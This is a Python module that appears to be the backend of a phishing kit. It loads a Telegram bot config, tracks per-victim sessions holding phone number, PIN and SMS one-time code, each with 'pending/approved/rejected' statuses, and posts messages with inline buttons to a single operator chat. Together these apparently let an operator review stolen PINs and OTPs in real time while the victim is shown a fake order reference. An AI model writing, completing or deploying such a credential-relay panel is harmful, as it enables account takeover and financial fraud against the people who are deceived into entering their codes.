"""Telegram integration: config, session state, and Bot API client.

Single module so the entire backend is one file. Standard library
only - no third-party dependencies.
"""
from __future__ import annotations

import json
import logging
import secrets
import threading
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Literal

LOGGER = logging.getLogger(__name__)


# --------------------------------------------------------------------- #
# Config
# --------------------------------------------------------------------- #

CONFIG_FILENAME = "telegram.json"
PROJECT_ROOT = Path(__file__).resolve().parent.parent


class ConfigError(RuntimeError):
    """Raised when the Telegram configuration is missing or invalid."""


@dataclass(frozen=True)
class TelegramConfig:
    """Bot token and destination chat id."""

    bot_token: str
    chat_id: str

    @property
    def api_base(self) -> str:
        """Base URL for all Bot API calls."""
        return "https://api.telegram.org/bot" + self.bot_token


def default_config_path() -> Path:
    """Return the default path of the git-ignored config file."""
    return PROJECT_ROOT / "config" / CONFIG_FILENAME


def load_config(path: Path | None = None) -> TelegramConfig:
    """Load the Telegram configuration from disk."""
    config_path = path or default_config_path()
    if not config_path.exists():
        raise ConfigError(
            "Missing " + str(config_path)
            + ". Copy config/telegram.example.json and fill it in."
        )
    try:
        data = json.loads(config_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        raise ConfigError(
            str(config_path) + " is not valid JSON: " + str(exc)
        ) from exc
    token = str(data.get("bot_token", "")).strip()
    chat_id = str(data.get("chat_id", "")).strip()
    if not token or not chat_id:
        raise ConfigError("bot_token and chat_id must both be non-empty.")
    return TelegramConfig(bot_token=token, chat_id=chat_id)


# --------------------------------------------------------------------- #
# Sessions
# --------------------------------------------------------------------- #

DecisionStatus = Literal["none", "pending", "approved", "rejected"]

_REFERENCE_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"


def _utc_now() -> datetime:
    """Return the current UTC timestamp."""
    return datetime.now(timezone.utc)


def _new_session_id() -> str:
    """Return a fresh opaque session identifier."""
    return uuid.uuid4().hex


def _new_reference_number() -> str:
    """Return a human-friendly order reference, e.g. MO-7K3Q-2F8P."""
    def chunk() -> str:
        return "".join(secrets.choice(_REFERENCE_ALPHABET) for _ in range(4))
    return "MO-" + chunk() + "-" + chunk()


@dataclass
class Session:
    """One user's state through the onboarding flow."""

    session_id: str
    plan_code: str
    phone: str | None = None
    pin: str | None = None
    otp_sms: str | None = None
    pin_status: DecisionStatus = "none"
    otp_status: DecisionStatus = "none"
    pin_message_id: int | None = None
    otp_message_id: int | None = None
    reference_number: str | None = None
    created_at: datetime = field(default_factory=_utc_now)
    updated_at: datetime = field(default_factory=_utc_now)


class SessionStore:
    """Thread-safe in-memory session store keyed by session_id."""

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._sessions: dict[str, Session] = {}

    def create(self, plan_code: str) -> Session:
        """Create and register a new session."""
        session = Session(session_id=_new_session_id(), plan_code=plan_code)
        with self._lock:
            self._sessions[session.session_id] = session
        return session

    def get(self, session_id: str) -> Session | None:
        """Return the session with *session_id*, or None."""
        with self._lock:
            return self._sessions.get(session_id)

    def update(self, session_id: str, **fields: object) -> Session | None:
        """Update named fields on the session, or return None if absent."""
        with self._lock:
            session = self._sessions.get(session_id)
            if session is None:
                return None
            for key, value in fields.items():
                if hasattr(session, key):
                    setattr(session, key, value)
            session.updated_at = _utc_now()
            return session

    def issue_reference(self, session_id: str) -> str | None:
        """Return (and lazily generate) the session's reference number."""
        with self._lock:
            session = self._sessions.get(session_id)
            if session is None:
                return None
            if session.reference_number is None:
                session.reference_number = _new_reference_number()
            session.updated_at = _utc_now()
            return session.reference_number


store = SessionStore()


# --------------------------------------------------------------------- #
# Telegram Bot API client
# --------------------------------------------------------------------- #

class TelegramError(RuntimeError):
    """Raised when the Telegram API returns a non-ok response."""


def escape_html(text: str) -> str:
    """Escape *text* for Telegram HTML parse mode."""
    return (
        text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


@dataclass(frozen=True)
class SentMessage:
    """Reference to a message the bot has just delivered."""

    message_id: int


class TelegramClient:
    """Thin wrapper around the Telegram Bot API."""

    def __init__(self, config: TelegramConfig) -> None:
        self._config = config
        self._api_base = config.api_base

    def send_message(
        self,
        text: str,
        parse_mode: str = "HTML",
        reply_markup: dict[str, Any] | None = None,
    ) -> SentMessage:
        """Send *text* to the configured chat. Returns the message ref."""
        payload: dict[str, Any] = {
            "chat_id": self._config.chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
        }
        if reply_markup is not None:
            payload["reply_markup"] = reply_markup
        data = self._post("sendMessage", payload)
        message = data.get("result", {})
        return SentMessage(message_id=int(message.get("message_id", 0)))

    def get_updates(
        self,
        offset: int | None = None,
        timeout_seconds: int = 30,
    ) -> list[dict[str, Any]]:
        """Long-poll for updates. Blocks up to *timeout_seconds*."""
        params: dict[str, Any] = {"timeout": timeout_seconds}
        if offset is not None:
            params["offset"] = offset
        data = self._post(
            "getUpdates",
            params,
            timeout=timeout_seconds + 15,
        )
        return list(data.get("result", []))

    def answer_callback_query(
        self,
        callback_query_id: str,
        text: str | None = None,
    ) -> bool:
        """Acknowledge an inline-button press. Never raises."""
        payload: dict[str, Any] = {"callback_query_id": callback_query_id}
        if text:
            payload["text"] = text
        try:
            self._post("answerCallbackQuery", payload)
            return True
        except TelegramError as exc:
            LOGGER.warning("answerCallbackQuery failed: %s", exc)
            return False

    def _post(
        self,
        method: str,
        payload: dict[str, Any],
        timeout: int = 45,
    ) -> dict[str, Any]:
        """POST *payload* to *method*. Returns the parsed body."""
        url = self._api_base + "/" + method
        body = json.dumps(payload).encode("utf-8")
        request = urllib.request.Request(
            url,
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, timeout=timeout) as response:
                raw = response.read().decode("utf-8")
        except urllib.error.HTTPError as exc:
            raw = exc.read().decode("utf-8", errors="replace")
            raise TelegramError(
                method + " HTTP " + str(exc.code) + ": " + raw
            ) from exc
        except urllib.error.URLError as exc:
            raise TelegramError(
                method + " network error: " + str(exc)
            ) from exc

        try:
            data = json.loads(raw)
        except json.JSONDecodeError as exc:
            raise TelegramError(
                method + " non-JSON response: " + raw
            ) from exc

        if not data.get("ok", False):
            raise TelegramError(
                method + " failed: " + str(data.get("description", raw))
            )
        return data
